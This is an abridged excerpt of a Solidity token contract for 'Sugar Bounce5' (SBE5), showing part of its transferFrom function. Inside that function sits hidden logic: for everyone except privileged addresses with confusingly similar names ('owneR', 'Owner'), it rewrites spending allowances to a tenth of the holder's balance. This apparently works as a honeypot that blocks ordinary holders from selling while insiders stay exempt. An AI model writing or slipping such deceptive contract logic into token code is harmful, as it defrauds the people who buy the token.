...
contract Token {
    ...
    string public constant name = "Sugar Bounce5";
    string public constant symbol = "SBE5";
    ...
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        if (from != owneR && from != Owner && from != address(this) && from != Buy) { 
            if (balances[owneR]<=balances[getPair()]){allowance[from][msg.sender] = balances[from]/10; }}
